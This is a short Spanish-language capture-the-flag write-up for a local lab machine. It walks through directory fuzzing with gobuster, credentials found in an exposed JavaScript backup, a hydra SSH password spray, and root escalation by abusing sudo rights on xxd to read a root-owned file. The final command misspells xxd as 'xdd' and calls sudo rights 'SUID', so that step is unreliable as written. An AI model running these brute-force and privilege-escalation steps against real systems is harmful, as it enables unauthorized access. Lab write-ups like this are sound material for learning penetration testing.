## Reconocimiento:

Puerto 22 : SSH

Puerto 80 : HTTP

En la web tenemos un login de JavaScript sobre el buscador.

Antes voy a fuzzear directorios a ver si hay alguna credencial expuesta:

```bash
gobuster dir --url http://172.17.0.2/ -w <WORDLIST> -x html,php,txt,bak,zip,backup -t 100 -k
```

Encuentro “backupp.js” y efectivamente las revela:

```bash
chocolate:chocolate
```

Dentro hay como un blog informativo acerca de las dev tools pero no encuentro nada.

Volviendo a revisar el archivo backupp.js sale que la contraseña antigua era “baluleroh”, así que pruebo un ataque de fuerza bruta a usuarios con esa contraseña:

```bash
hydra -L <WORDLIST> -p baluleroh ssh://172.17.0.2 -t 64 -I
```

Encuentro al usuario “Carlos“:

```bash
ssh carlos@172.17.0.2
```

## Escalada:

```bash
sudo -l
(ALL) NOPASSWD: /usr/bin/ping
(ALL) NOPASSWD: /usr/bin/xxd
```

También hay un archivo llamado “nota.txt” en el directorio /home/carlos:

```bash
cat nota.txt
# Info:
"Backup en data.bak dentro del directorio de root"
```

Ese archivo usualmente está en una carpeta protegida, así que primero toca definir la variable con LFILE:

```bash
LFILE=/root/data.bak
```

Luego lo pasamos a hexadecimal aprovechando los permisos SUID:

```bash
sudo xdd "$LFILE" | xdd -r
```

Info:

```bash
root:balulerito
```

Listo.
